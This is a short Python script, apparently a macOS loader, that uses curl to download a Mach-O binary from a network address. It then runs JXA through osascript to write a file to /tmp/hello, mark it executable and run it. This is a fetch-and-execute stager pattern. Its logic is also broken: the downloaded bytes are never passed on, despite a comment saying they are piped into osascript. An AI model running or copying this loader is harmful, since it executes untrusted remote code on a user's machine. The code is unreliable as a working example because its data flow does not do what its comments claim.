#!/usr/bin/env python3
import subprocess

# URL of your Mach-O binary
url = "http://192.168.1.26/hello_macho"

# JXA script as a single string
jxa_script = f'''
var app = Application.currentApplication();
app.includeStandardAdditions = true;
var tmp="/tmp/hello";
app.doShellScript("cat > " + tmp);
app.doShellScript("chmod +x " + tmp + " && " + tmp);
'''

# Run curl piped into osascript
try:
    subprocess.run(
        ["curl", "-s", url],
        stdout=subprocess.PIPE,
        check=True
    )
except subprocess.CalledProcessError:
    print("Failed to download the Mach-O binary.")
    exit(1)

# Run the JXA script via osascript
try:
    proc = subprocess.run(
        ["osascript", "-l", "JavaScript"],
        input=jxa_script.encode(),
        check=True
    )
except subprocess.CalledProcessError:
    print("Failed to run JXA script.")
    exit(1)
